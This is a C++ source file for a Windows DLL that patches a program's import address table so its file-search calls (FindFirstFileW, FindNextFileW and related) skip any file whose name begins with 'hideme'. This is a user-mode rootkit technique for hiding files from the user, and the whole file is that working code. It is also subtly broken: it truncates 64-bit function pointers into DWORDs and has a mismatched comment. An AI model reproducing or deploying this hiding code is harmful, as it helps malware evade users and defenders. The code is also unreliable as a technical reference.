// dllmain.cpp : Defines the entry point for the DLL application.
#include<Windows.h>
#include<cstdio>

#define HIDE L"hideme"
#define HIDEA "hideme"

int hook(PCSTR func_to_hook, DWORD new_func_address, PDWORD old_func_address);
PIMAGE_THUNK_DATA getAdressesThunk(PCSTR func_to_hook);
PIMAGE_IMPORT_DESCRIPTOR getImportDescriptor(HANDLE base_address);

DWORD oldFindFirstFileW;
HANDLE WINAPI newFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);

DWORD oldFindFirstFileExW;
HANDLE WINAPI newFindFirstFileExW(LPCTSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);

DWORD oldFindNextFileW;
BOOL WINAPI newFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);

DWORD oldFindNextFileA;
BOOL WINAPI newFindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
		printf("LOADED!\n");
		printf("Hooking FindFirstFileW...\n");
		printf("FindFirstFileW: %d\n", hook("FindFirstFileW", (DWORD)&newFindFirstFileW, &oldFindFirstFileW));
		printf("Hooking FindFirstFileExW...\n");
		printf("FindFirstFileExW: %d\n", hook("FindFirstFileExW", (DWORD)&newFindFirstFileExW, &oldFindFirstFileExW));
		printf("Hooking FindNextFileW...\n");
		printf("FindNextFileW: %d\n", hook("FindNextFileW", (DWORD)&newFindNextFileW, &oldFindNextFileW));
		printf("Hooking FindNextFileA...\n");
		printf("FindNextFileA: %d\n", hook("FindNextFileA", (DWORD)&newFindNextFileA, &oldFindNextFileA));
		break;
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

int hook(PCSTR func_to_hook, DWORD new_func_address, PDWORD old_func_address) {
	// get the correct IAT
	printf("getAdressesThunk\n");
	auto addresses_thunk = getAdressesThunk(func_to_hook);
	if (!addresses_thunk)
		return -1;

	*old_func_address = addresses_thunk->u1.Function;
	DWORD old_protect = NULL;

	// set the virtual protect of the IAT to "PAGE_READWRITE"
	VirtualProtect((LPVOID) & (addresses_thunk->u1.Function),
		sizeof(DWORD),
		PAGE_READWRITE,
		&old_protect);

	// edit the IAT
	addresses_thunk->u1.Function = new_func_address;

	// return the old virtual protect if the IAT
	VirtualProtect((LPVOID) & (addresses_thunk->u1.Function),
		sizeof(DWORD),
		old_protect,
		NULL);

	return 0;
}

PIMAGE_THUNK_DATA getAdressesThunk(PCSTR func_to_hook) {
	// find the base address of the current exe
	HANDLE base_address = GetModuleHandle(NULL);
	printf("base address: %d\n", base_address);
	// get the imoprt descriptor
	printf("getImportDescriptor\n");
	auto import_descriptor = getImportDescriptor(base_address);
	printf("got ImportDescriptor\n");
	if (!import_descriptor)
		return NULL;

	PIMAGE_THUNK_DATA names_thunk, addresses_thunk;
	PIMAGE_IMPORT_BY_NAME func_name_data;
	int index = 0;
	// iterate all the DLLs
	printf("iterate dlls\n");
	while (import_descriptor[index].Characteristics) {
		// iterate all the function in the DLL, 
		// in order to find the function to hook
		printf("\n%s\n---------\n", (char*)((PBYTE)base_address + import_descriptor[index].Name));
		names_thunk = (PIMAGE_THUNK_DATA)((PBYTE)base_address + import_descriptor[index].OriginalFirstThunk);
		addresses_thunk = (PIMAGE_THUNK_DATA)((PBYTE)base_address + import_descriptor[index].FirstThunk);

		if (!names_thunk || !addresses_thunk)
			return NULL;

		while (*(WORD*)names_thunk != NULL && *(WORD*)addresses_thunk != NULL) {
			func_name_data = (PIMAGE_IMPORT_BY_NAME)((PBYTE)base_address + names_thunk->u1.AddressOfData);
			printf("%s\n", func_name_data->Name);
			if (!strcmp(func_name_data->Name, func_to_hook))
				return addresses_thunk;
			names_thunk++;
			addresses_thunk++;
		}
		index++;
	}
	return NULL;
}

PIMAGE_IMPORT_DESCRIPTOR getImportDescriptor(HANDLE base_address) {
	printf("dos header\n");
	auto dos_header = (PIMAGE_DOS_HEADER)base_address;
	printf("dos header 2\n");
	// check the "MZ" magic word
	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;
	
	printf("nt header\n");
	// find NT Header
	auto nt_header = (PIMAGE_NT_HEADERS)((PBYTE)base_address + dos_header->e_lfanew);
	if (nt_header->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	printf("optipnal header\n");
	// find Optional Header
	auto optional_header = nt_header->OptionalHeader;
	// check that the exe is 64 bit
	if (optional_header.Magic != 0x20B)
		return NULL;

	// find the import descriptor
	printf("import directory\n");
	auto import_directory = optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	auto descriptor_start_RVA = import_directory.VirtualAddress;
	return (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)base_address + descriptor_start_RVA);
}

typedef BOOL(WINAPI* ptrFindNextFileW) (_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
BOOL WINAPI newFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData) {
	auto original = (ptrFindNextFileW)oldFindNextFileW;
	BOOL ret;
	do
	{
		ret = (original)(hFindFile, lpFindFileData);
	} while ((ret != 0) && // While there are more files and ...
		(wcsstr(lpFindFileData->cFileName, HIDE) == lpFindFileData->cFileName)); // it's "hideme"
	return ret;
}

typedef HANDLE(WINAPI* ptrFindFirstFileW) (_In_ LPCWSTR lpFileName, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
HANDLE WINAPI newFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData) {
	auto original = (ptrFindFirstFileW)oldFindFirstFileW;

	HANDLE handle = (original)(lpFileName, lpFindFileData);
	if (handle == INVALID_HANDLE_VALUE)
		return handle;

	LPWIN32_FIND_DATAW findFileData = (LPWIN32_FIND_DATAW)lpFindFileData;
	if (wcsstr(lpFindFileData->cFileName, HIDE) == lpFindFileData->cFileName) {
		BOOL ret = FindNextFileW(handle, lpFindFileData);
		if (ret == 0)
			return INVALID_HANDLE_VALUE;
	}
	return handle;
}

typedef HANDLE(WINAPI* ptrFindFirstFileExW) (LPCTSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);

HANDLE WINAPI newFindFirstFileExW(LPCTSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags) {
	auto original = (ptrFindFirstFileExW)oldFindFirstFileExW;

	HANDLE handle = (original)(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
	if (handle == INVALID_HANDLE_VALUE)
		return handle;

	LPWIN32_FIND_DATAW findFileData = (LPWIN32_FIND_DATAW)lpFindFileData;
	if (wcsstr(findFileData->cFileName, HIDE) == findFileData->cFileName) // We have to hide it!
	{
		BOOL ret = FindNextFileW(handle, findFileData);
		if (ret == 0)
			return INVALID_HANDLE_VALUE;
		else
			return handle;
	}

	return handle;

}

typedef BOOL(WINAPI* ptrFindNextFileA) (HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);

BOOL WINAPI newFindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
{
	auto original = (ptrFindNextFileA)oldFindNextFileA;
	BOOL ret;
	do
	{
		ret = (original)(hFindFile, lpFindFileData);
	} while ((ret != 0) &&															  // While there are more files and ...
		(strstr(lpFindFileData->cFileName, HIDEA) == lpFindFileData->cFileName)); // it's starting with "hideit_"

	return ret;
}
